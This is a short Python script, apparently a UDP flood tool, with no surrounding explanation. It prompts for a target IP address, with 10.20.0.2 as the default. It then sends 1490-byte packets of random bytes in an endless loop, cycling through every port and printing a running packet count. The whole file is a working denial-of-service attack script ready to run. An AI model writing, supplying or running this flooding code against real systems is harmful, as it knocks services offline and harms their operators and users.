import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

ip = input("Enter IP: ")

if ip == "":
    ip = "10.20.0.2"
port = 1

sent = 0

while True:
    sock.sendto(bytes, (ip, port))
    sent = sent + 1
    port = port + 1
    print("Sent %s packet to %s throught port:%s" % (sent,ip,port))
    if port == 65534:
        port = 1